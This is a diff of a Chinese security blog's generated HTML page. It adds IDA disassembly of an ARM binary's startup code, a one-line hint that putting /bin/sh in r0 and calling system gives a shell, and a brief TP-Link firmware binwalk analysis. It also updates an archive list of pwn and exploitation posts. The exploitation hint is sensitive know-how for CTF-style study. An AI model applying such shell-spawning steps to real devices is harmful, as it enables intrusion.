+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.text:00008B9C                 MOV     LR, #0</span><br><span class="line">.text:00008BA0                 LDR     R1, [SP+arg_0],#4</span><br><span class="line">.text:00008BA4                 MOV     R2, SP</span><br><span class="line">.text:00008BA8                 STR     R2, [SP,#-4+arg_0]!</span><br><span class="line">.text:00008BAC                 STR     R0, [SP,#var_4]!</span><br><span class="line">.text:00008BB0                 LDR     R12, =__libc_thread_freeres</span><br><span class="line">.text:00008BB4                 STR     R12, [SP,#4+var_8]!</span><br><span class="line">.text:00008BB8                 LDR     R0, =sub_8F00//这个函数是main</span><br><span class="line">.text:00008BBC                 LDR     R3, =sub_A5EC</span><br><span class="line">.text:00008BC0                 BL      sub_9EBC</span><br><span class="line">.text:00008BC4                 BL      sub_F0E0</span><br></pre></td></tr></table></figure>
+<p>arm架构按r0，r1的顺序使用寄存器，所以让r0为/bin/sh再调用system就好了</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/afl/">afl</a></h1>
   
 
     </header>
@@ -2321,7 +2291,7 @@ upx项目地址([*https://github.com/upx/upx*)
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -2341,8 +2311,48 @@ upx项目地址([*https://github.com/upx/upx*)
     <header>
       
         <div class="icon"></div>
-     
+        
       
+  
+    <h1 class="title"><a href="/2018/12/11/tp/">tplink</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="tplink"><a href="#tplink" class="headerlink" title="tplink"></a>tplink</h1><p>下载固件</p>
+<p>binwalk查看信息，mips架构，linux 64系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">13216         0x33A0          CRC32 polynomial table, big endian</span><br><span class="line">14456         0x3878          uImage header, header size: 64 bytes, header CRC: 0x19639265, created: 2018-01-03 05:36:50, image size: 34683 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x6881FE43, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: &quot;u-boot image&quot;</span><br><span class="line">14520         0x38B8          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 90472 bytes</span><br><span class="line">50752         0xC640          ELF, 32-bit MSB MIPS64 executable, MIPS, version 1 (SYSV)</span><br><span class="line">66816         0x10500         LZMA compressed data, properties: 0x6D, dictionary size: 1048576 bytes, uncompressed size: -1 bytes</span><br><span class="line">793268        0xC1AB4         Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 4290385 bytes, 756 inodes, blocksize: 131072 bytes, created: 2018-11-20 03:42:21</span><br></pre></td></tr></table></figure>
+<p>解压后的.bin用binwalk提取</p>
+<p>binwalk elf ，小端序，ida打开进行分析</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
       
   
     <h1 class="title"><a href="/2018/07/07/各种脚本/">各种脚本（比赛时候懒得现写）</a></h1>
@@ -2385,7 +2395,7 @@ xor al
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -2409,11 +2419,51 @@ xor al
 
   
 <div class="widget tag">
-  <h3 class="title">archives</h3>
+  <h3 class="title">Archive</h3>
   <ul class="entry">
     
       <li>
-        <a href="/2018/12/11/sulb/">slub</a>
+        <a href="/2018/12/11/文件读写内存实例/">文件读写内存实例</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/11/漏洞挖掘/">漏洞挖掘</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/11/内核编译/">内核编译</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/11/两道内核/">驱动漏洞</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/11/关闭nx与反弹shell/">关闭nx与反弹shell</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/11/分布式/">分布式搭建</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/11/符号表恢复/">符号表恢复</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/11/堆溢出/">堆溢出</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/11/windows机制/">windows机制</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/11/windbg学习总结/">windbg学习总结</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/11/web/">随意码的web</a>
       </li>
     
       <li>
@@ -2421,115 +2471,79 @@ xor al
       </li>
     
       <li>
-        <a href="/2018/11/27/MemGC/">几种安全机制</a>
+        <a href="/2018/12/11/tls/">tls</a>
       </li>
     
       <li>
-        <a href="/2018/11/15/debug-vm分析/">debug-vm分析</a>
+        <a href="/2018/12/11/tcache/">tcache</a>
       </li>
     
       <li>
-        <a href="/2018/11/13/符号表恢复/">符号表恢复</a>
+        <a href="/2018/12/11/sulb/">slub</a>
       </li>
     
       <li>
-        <a href="/2018/11/13/arm架构初探/">arm架构利用</a>
+        <a href="/2018/12/11/rtd/">return-to-dl-reslove</a>
       </li>
     
       <li>
-        <a href="/2018/11/10/tls/">tls</a>
+        <a href="/2018/12/11/pwnable.tw/">pwnable.tw总结</a>
       </li>
     
       <li>
-        <a href="/2018/11/10/tcache/">tcache</a>
+        <a href="/2018/12/11/patch/">patch</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/漏洞挖掘/">漏洞挖掘</a>
+        <a href="/2018/12/11/offbyone/">off-by-one</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/文件读写内存实例/">文件读写内存实例</a>
+        <a href="/2018/12/11/hor/">House-Of-Rabbit</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/堆溢出/">堆溢出</a>
+        <a href="/2018/12/11/MemGC/">几种安全机制</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/分布式/">分布式搭建</a>
+        <a href="/2018/12/11/hfo/">house-of-orange</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/内核编译/">内核编译</a>
+        <a href="/2018/12/11/hexo/">搭建博客</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/关闭nx与反弹shell/">关闭nx与反弹shell</a>
+        <a href="/2018/12/11/glibc malloc和free/">glibc malloc和free</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/两道内核/">驱动漏洞</a>
+        <a href="/2018/12/11/doublefree/">double free</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/windows机制/">windows机制</a>
+        <a href="/2018/12/11/debug-vm分析/">debug-vm分析</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/windbg学习总结/">windbg学习总结</a>
+        <a href="/2018/12/11/brop/">brop</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/web/">随意码的web</a>
+        <a href="/2018/12/11/bpf/">bpf</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/rtd/">return-to-dl-reslove</a>
+        <a href="/2018/12/11/arm架构初探/">arm架构利用</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/pwnable.tw/">pwnable.tw总结</a>
+        <a href="/2018/12/11/afl/">afl</a>
       </li>
     
       <li>
-        <a href="/2018/10/21/patch/">patch</a>
-      </li>
-    
-      <li>
-        <a href="/2018/10/21/offbyone/">off-by-one</a>
-      </li>
-    
-      <li>
-        <a href="/2018/10/21/hor/">House-Of-Rabbit</a>
-      </li>
-    
-      <li>
-        <a href="/2018/10/21/hfo/">house-of-orange</a>
-      </li>
-    
-      <li>
-        <a href="/2018/10/21/hexo/">搭建博客</a>
-      </li>
-    
-      <li>
-        <a href="/2018/10/21/glibc malloc和free/">glibc malloc和free</a>
-      </li>
-    
-      <li>
-        <a href="/2018/10/21/doublefree/">double free</a>
-      </li>
-    
-      <li>
-        <a href="/2018/10/21/brop/">brop</a>
-      </li>
-    
-      <li>
-        <a href="/2018/10/21/bpf/">bpf</a>
-      </li>
-    
-      <li>
-        <a href="/2018/10/21/afl/">afl</a>
+        <a href="/2018/12/11/tp/">tplink</a>
       </li>
     
       <li>
